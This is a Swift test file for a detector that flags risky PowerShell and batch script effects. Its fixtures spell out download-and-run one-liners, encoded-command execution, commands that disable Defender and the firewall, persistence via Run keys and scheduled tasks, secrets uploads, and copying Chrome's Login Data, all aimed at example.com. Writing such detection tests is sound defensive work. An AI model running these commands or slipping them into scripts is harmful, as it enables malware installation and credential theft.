import Foundation
import Testing
import PreviewContracts
@testable import PreviewFormats

// PowerShell and batch scripts. Fixtures are synthetic: example domains, no real payloads.

@Suite("Script effects: PowerShell")
struct ScriptEffectsPowerShellTests {
    static let positives: [ScriptCase] = [
        // Download and run.
        ScriptCase("iwr piped to iex", "iwr https://example.com/i.ps1 | iex\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("irm piped to iex", "irm https://example.com/i.ps1 | iex\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("long names", "Invoke-WebRequest https://example.com/i.ps1 -UseBasicParsing | Invoke-Expression\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("iex of irm in parentheses", "iex (irm https://example.com/i.ps1)\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("Invoke-Expression of Invoke-RestMethod", "Invoke-Expression (Invoke-RestMethod -Uri https://example.com/i.ps1)\n",
                   language: .powerShell, [.downloadAndRun()]),
        ScriptCase("WebClient DownloadString", "iex ((New-Object Net.WebClient).DownloadString('https://example.com/i.ps1'))\n",
                   language: .powerShell, [.downloadAndRun()]),
        ScriptCase("WebClient with a full type name", "iex (New-Object System.Net.WebClient).DownloadString(\"https://example.com/i.ps1\")\n",
                   language: .powerShell, [.downloadAndRun()]),
        ScriptCase("content of a web request", "Invoke-Expression (Invoke-WebRequest -UseBasicParsing https://example.com/i.ps1).Content\n",
                   language: .powerShell, [.downloadAndRun()]),
        ScriptCase("sub-expression in a string", "iex \"& { $(irm https://example.com/install.ps1) } -UseMSI\"\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("script block created from a download", "& ([scriptblock]::Create((irm https://example.com/i.ps1)))\n",
                   language: .powerShell, [.downloadAndRun()]),
        ScriptCase("DownloadFile then Start-Process", "(New-Object Net.WebClient).DownloadFile($url, $out); Start-Process $out\n",
                   language: .powerShell, [.downloadAndRun()]),
        ScriptCase("OutFile then Start-Process", "Invoke-WebRequest $url -OutFile $out; Start-Process $out\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("backtick continuation", "irm https://example.com/i.ps1 `\n  | iex\nWrite-Host done\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("pipe continuation", "irm https://example.com/i.ps1 |\n  iex\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("open parenthesis continuation", "iex (\n  irm https://example.com/i.ps1\n)\n", language: .powerShell, [.downloadAndRun()]),
        ScriptCase("powershell -Command from PowerShell", "powershell -NoProfile -Command \"irm https://example.com/i.ps1 | iex\"\n",
                   language: .powerShell, [.downloadAndRun()]),
        ScriptCase("second line only", "Write-Host start\nirm https://example.com/i.ps1 | iex\n", language: .powerShell, [.downloadAndRun(1, at: [2])]),
        // Decode and run.
        ScriptCase("FromBase64String into iex", "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)))\n",
                   language: .powerShell, [.decodeAndRun()]),
        ScriptCase("FromBase64String into Invoke-Expression",
                   "Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"aGk=\")))\n",
                   language: .powerShell, [.decodeAndRun()]),
        ScriptCase("-EncodedCommand", "powershell -EncodedCommand SQBFAFgA\n", language: .powerShell, [.decodeAndRun()]),
        ScriptCase("-enc with other options", "powershell.exe -NoProfile -w hidden -enc SQBFAFgA\n", language: .powerShell, [.decodeAndRun()]),
        ScriptCase("-ec", "pwsh -ec SQBFAFgA\n", language: .powerShell, [.decodeAndRun()]),
        ScriptCase("-e", "pwsh -e SQBFAFgA\n", language: .powerShell, [.decodeAndRun()]),
        // Protection.
        ScriptCase("Defender real-time protection off", "Set-MpPreference -DisableRealtimeMonitoring $true\n", language: .powerShell, [.protection()]),
        ScriptCase("Defender option with a number", "Set-MpPreference -DisableIOAVProtection 1\n", language: .powerShell, [.protection()]),
        ScriptCase("Defender exclusion path", "Add-MpPreference -ExclusionPath C:\\Temp\n", language: .powerShell, [.protection()]),
        ScriptCase("Defender exclusion extension", "Add-MpPreference -ExclusionExtension .exe\n", language: .powerShell, [.protection()]),
        // Password.
        ScriptCase("Get-Credential", "$cred = Get-Credential\n", language: .powerShell, [.password()]),
        ScriptCase("Get-Credential with a message", "Get-Credential -Message 'Sign in'\n", language: .powerShell, [.password()]),
        ScriptCase("PromptForCredential", "$cred = $host.ui.PromptForCredential('Sign in', 'Enter your credentials', '', '')\n", language: .powerShell, [.password()]),
        ScriptCase("Read-Host -AsSecureString", "$p = Read-Host -AsSecureString\n", language: .powerShell, [.password()]),
        // Elevation.
        ScriptCase("Start-Process -Verb RunAs", "Start-Process powershell -Verb RunAs\n", language: .powerShell, [.elevates()]),
        ScriptCase("Start-Process -Verb runas lowercase", "Start-Process -FilePath x.exe -Verb runas\n", language: .powerShell, [.elevates()]),
        ScriptCase("Start-Process -Verb:RunAs", "Start-Process -Verb:RunAs x.exe\n", language: .powerShell, [.elevates()]),
        ScriptCase("runas", "runas /user:Administrator cmd\n", language: .powerShell, [.elevates()]),
        // Persistence.
        ScriptCase("schtasks /create", "schtasks /create /tn Example /tr x.exe /sc onlogon\n", language: .powerShell, [.persistence()]),
        ScriptCase("reg add Run", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Example /d x.exe\n", language: .powerShell, [.persistence()]),
        ScriptCase("New-ItemProperty Run", "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name Example -Value x.exe\n",
                   language: .powerShell, [.persistence()]),
        ScriptCase("Set-ItemProperty RunOnce", "Set-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' Example x.exe\n",
                   language: .powerShell, [.persistence()]),
        ScriptCase("Register-ScheduledTask", "Register-ScheduledTask -TaskName Example -Action $action -Trigger $trigger\n", language: .powerShell, [.persistence()]),
        ScriptCase("Startup folder", "Copy-Item x.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n", language: .powerShell, [.persistence()]),
        // Uploads.
        ScriptCase("Invoke-RestMethod -InFile", "Invoke-RestMethod -Uri https://example.com/up -Method Post -InFile data.bin\n", language: .powerShell, [.uploads()]),
        ScriptCase("Invoke-WebRequest -InFile", "Invoke-WebRequest https://example.com/up -Method Put -InFile data.bin\n", language: .powerShell, [.uploads()]),
        ScriptCase("body from Get-Content", "irm -Uri https://example.com/up -Method Post -Body (Get-Content secrets.txt -Raw)\n", language: .powerShell, [.uploads()]),
        ScriptCase("body from ReadAllBytes", "Invoke-RestMethod -Method Post -Body ([IO.File]::ReadAllBytes($path)) -Uri https://example.com/up\n",
                   language: .powerShell, [.uploads()]),
        ScriptCase("WebClient UploadFile", "(New-Object Net.WebClient).UploadFile('https://example.com/up', 'a.zip')\n", language: .powerShell, [.uploads()]),
        // Secrets.
        ScriptCase("Chrome Login Data", "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" $env:TEMP\n", language: .powerShell, [.secrets()]),
        ScriptCase("Chrome Local State", "Get-Content \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State\"\n", language: .powerShell, [.secrets()])
    ]

    @Test(arguments: positives) func reportsEffects(_ scenario: ScriptCase) throws { try scenario.check() }

    static let nearMisses: [ScriptCase] = [
        ScriptCase("download to a file", "Invoke-WebRequest https://example.com/f.zip -OutFile f.zip\n", language: .powerShell),
        ScriptCase("download and parse", "irm https://api.example.com/v1/items | ConvertFrom-Json\n", language: .powerShell),
        ScriptCase("DownloadString kept as text", "$text = (New-Object Net.WebClient).DownloadString('https://example.com/a.txt')\n", language: .powerShell),
        ScriptCase("Invoke-Expression of a local command", "Invoke-Expression \"Get-Date\"\n", language: .powerShell),
        ScriptCase("download on one line, iex on the next", "$s = irm https://example.com/i.ps1\niex $s\n", language: .powerShell),
        ScriptCase("message", "Write-Host \"use iwr and iex\"\n", language: .powerShell),
        ScriptCase("single-quoted message", "Write-Output 'irm https://example.com/i.ps1 | iex'\n", language: .powerShell),
        ScriptCase("line comment", "# iwr https://example.com/i.ps1 | iex\n", language: .powerShell),
        ScriptCase("block comment", "<#\niex (irm https://example.com/i.ps1)\nSet-MpPreference -DisableRealtimeMonitoring $true\n#>\nWrite-Host ok\n", language: .powerShell),
        ScriptCase("trailing comment", "Write-Host ok # irm https://x | iex\n", language: .powerShell),
        ScriptCase("here-string text", "$x = @\"\niwr https://example.com | iex\n\"@\nWrite-Output $x\n", language: .powerShell),
        ScriptCase("decode without running", "[Convert]::FromBase64String($blob) | Set-Content out.bin -AsByteStream\n", language: .powerShell),
        ScriptCase("decode to text", "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))\n", language: .powerShell),
        ScriptCase("powershell -File", "powershell -ExecutionPolicy Bypass -File setup.ps1\n", language: .powerShell),
        ScriptCase("powershell -Command of a plain command", "powershell -NoProfile -Command \"Get-Date\"\n", language: .powerShell),
        ScriptCase("Defender real-time protection on", "Set-MpPreference -DisableRealtimeMonitoring $false\n", language: .powerShell),
        ScriptCase("Defender read", "Get-MpPreference\n", language: .powerShell),
        ScriptCase("Defender other setting", "Set-MpPreference -ScanAvgCPULoadFactor 20\n", language: .powerShell),
        ScriptCase("Read-Host plain", "$name = Read-Host \"Name\"\n", language: .powerShell),
        ScriptCase("Start-Process plain", "Start-Process notepad\n", language: .powerShell),
        ScriptCase("Start-Process another verb", "Start-Process readme.txt -Verb Open\n", language: .powerShell),
        ScriptCase("RunAs in a message", "Write-Host \"RunAs administrator\"\n", language: .powerShell),
        ScriptCase("schtasks query", "schtasks /query /tn Example\n", language: .powerShell),
        ScriptCase("registry read", "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n", language: .powerShell),
        ScriptCase("registry write elsewhere", "Set-ItemProperty -Path HKCU:\\Software\\Example -Name a -Value 1\n", language: .powerShell),
        ScriptCase("JSON body", "Invoke-RestMethod -Uri https://example.com/api -Method Post -Body '{\"a\":1}'\n", language: .powerShell),
        ScriptCase("plain request", "Invoke-RestMethod https://example.com/api\n", language: .powerShell),
        ScriptCase("Chrome bookmarks", "Get-Content \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Bookmarks\"\n", language: .powerShell)
    ]

    @Test(arguments: nearMisses) func staysSilent(_ scenario: ScriptCase) throws { try scenario.check() }
}

@Suite("Script effects: batch")
struct ScriptEffectsBatchTests {
    static let positives: [ScriptCase] = [
        ScriptCase("certutil then start", "certutil -urlcache -split -f http://example.com/a.exe a.exe\nstart a.exe\n", language: .batch, [.downloadAndRun(1, at: [1])]),
        ScriptCase("certutil then direct run", "certutil -urlcache -f http://example.com/a.exe %TEMP%\\a.exe\n%TEMP%\\a.exe\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil and run on one line", "certutil -urlcache -f http://example.com/a.exe a.exe && a.exe\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil then call", "certutil -urlcache -f http://example.com/a.bat a.bat\ncall a.bat\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil, other lines, run", "certutil -urlcache -f http://example.com/a.exe a.exe\necho ok\ncd .\nstart /b a.exe\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil then run with a window title", "certutil -urlcache -f http://example.com/a.exe a.exe\nstart \"\" /min a.exe\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil then run with a named window", "certutil -urlcache -f http://example.com/a.exe a.exe\nstart \"Updater\" /wait a.exe\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil continuation", "certutil -urlcache -f ^\n  http://example.com/a.exe a.exe\na.exe\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil in an if", "if exist x.txt (certutil -urlcache -f http://example.com/a.exe a.exe) else (echo no)\ncall a.exe\n",
                   language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil through cmd /c", "cmd /c certutil -urlcache -f http://example.com/a.exe a.exe\nstart a.exe\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("bitsadmin then run", "bitsadmin /transfer job /download /priority high http://example.com/a.exe %TEMP%\\a.exe\n%TEMP%\\a.exe\n",
                   language: .batch, [.downloadAndRun()]),
        ScriptCase("certutil -decode then run", "certutil -decode in.b64 out.exe\nout.exe\n", language: .batch, [.decodeAndRun()]),
        ScriptCase("powershell with iex", "powershell -NoP -W Hidden -c \"iex (iwr http://example.com/a.ps1)\"\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("powershell with irm and iex", "powershell -ep bypass -command \"irm https://example.com/i.ps1 | iex\"\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("powershell with DownloadString", "powershell -c \"iex(New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')\"\n", language: .batch, [.downloadAndRun()]),
        ScriptCase("powershell -EncodedCommand", "powershell.exe -ep bypass -EncodedCommand SQBFAFgA\n", language: .batch, [.decodeAndRun()]),
        ScriptCase("powershell -enc through start", "start /min powershell -w hidden -enc SQBFAFgA\n", language: .batch, [.decodeAndRun()]),
        ScriptCase("powershell disabling Defender", "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"\n", language: .batch, [.protection()]),
        ScriptCase("netsh all profiles", "netsh advfirewall set allprofiles state off\n", language: .batch, [.protection()]),
        ScriptCase("netsh current profile", "netsh advfirewall set currentprofile state off\n", language: .batch, [.protection()]),
        ScriptCase("netsh old syntax", "netsh firewall set opmode disable\n", language: .batch, [.protection()]),
        ScriptCase("reg add Run", "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Example /d x.exe /f\n", language: .batch, [.persistence()]),
        ScriptCase("reg add RunOnce", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v Example /d x.exe\n", language: .batch, [.persistence()]),
        ScriptCase("schtasks /create", "schtasks /create /tn Example /tr x.exe /sc daily\n", language: .batch, [.persistence()]),
        ScriptCase("copy into Startup", "copy x.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n", language: .batch, [.persistence()]),
        ScriptCase("redirect into Startup", "echo start x.exe > \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.bat\"\n", language: .batch, [.persistence()]),
        ScriptCase("runas", "runas /user:Administrator cmd\n", language: .batch, [.elevates()]),
        ScriptCase("PowerShell RunAs", "powershell Start-Process cmd -Verb RunAs\n", language: .batch, [.elevates()]),
        ScriptCase("curl upload", "curl -F \"file=@C:\\secret.txt\" https://example.com/up\n", language: .batch, [.uploads()]),
        ScriptCase("curl.exe upload", "curl.exe -T a.txt https://example.com/up\n", language: .batch, [.uploads()]),
        ScriptCase("after echo off and a comment", "@echo off\nrem setup\ncertutil -urlcache -f http://example.com/a.exe a.exe\nstart a.exe\n", language: .batch, [.downloadAndRun(1, at: [3])])
    ]

    @Test(arguments: positives) func reportsEffects(_ scenario: ScriptCase) throws { try scenario.check() }

    static let nearMisses: [ScriptCase] = [
        ScriptCase("certutil hash", "certutil -hashfile a.exe SHA256\n", language: .batch),
        ScriptCase("certutil download, never run", "certutil -urlcache -f http://example.com/a.txt a.txt\ntype a.txt\n", language: .batch),
        ScriptCase("certutil -urlcache without -f", "certutil -urlcache * delete\n", language: .batch),
        ScriptCase("run a different file", "certutil -urlcache -f http://example.com/a.exe a.exe\nb.exe\n", language: .batch),
        ScriptCase("bitsadmin list", "bitsadmin /list\n", language: .batch),
        ScriptCase("REM comment", "REM certutil -urlcache -f http://example.com/a.exe a.exe\nREM start a.exe\n", language: .batch),
        ScriptCase("double-colon comment", ":: powershell -enc AAAA\n", language: .batch),
        ScriptCase("echoed text", "echo certutil -urlcache -f http://example.com/a.exe a.exe\n", language: .batch),
        ScriptCase("echoed netsh", "echo netsh advfirewall set allprofiles state off\n", language: .batch),
        ScriptCase("label", ":certutil\n", language: .batch),
        ScriptCase("powershell -File", "powershell -ExecutionPolicy Bypass -File setup.ps1\n", language: .batch),
        ScriptCase("powershell plain command", "powershell -NoProfile -Command \"Get-Date\"\n", language: .batch),
        ScriptCase("Defender on", "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $false\"\n", language: .batch),
        ScriptCase("netsh show", "netsh advfirewall show allprofiles\n", language: .batch),
        ScriptCase("netsh state on", "netsh advfirewall set allprofiles state on\n", language: .batch),
        ScriptCase("netsh interface", "netsh interface show interface\n", language: .batch),
        ScriptCase("reg query Run", "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n", language: .batch),
        ScriptCase("reg add elsewhere", "reg add HKCU\\Software\\Example /v a /d b\n", language: .batch),
        ScriptCase("schtasks query", "schtasks /query\n", language: .batch),
        ScriptCase("schtasks delete", "schtasks /delete /tn Example /f\n", language: .batch),
        ScriptCase("copy somewhere else", "copy a.txt b.txt\n", language: .batch),
        ScriptCase("curl without a file", "curl -d \"a=b\" https://example.com/api\n", language: .batch),
        ScriptCase("ordinary build script", "@echo off\nsetlocal\nset OUT=build\nif not exist %OUT% mkdir %OUT%\ncl /nologo main.c /Fe%OUT%\\main.exe\nif errorlevel 1 exit /b 1\n", language: .batch)
    ]

    @Test(arguments: nearMisses) func staysSilent(_ scenario: ScriptCase) throws { try scenario.check() }
}
